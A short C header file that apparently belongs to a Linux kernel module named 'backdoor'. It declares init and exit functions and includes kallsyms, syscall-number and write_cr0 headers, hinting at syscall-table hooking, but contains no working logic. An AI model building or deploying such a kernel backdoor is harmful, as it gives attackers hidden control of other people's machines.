#ifndef _BACKDOOR_H
#define _BACKDOOR_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <asm/paravirt.h> // write_cr0

int __init backdoor_init(void);
void __exit backdoor_exit(void);

#endif
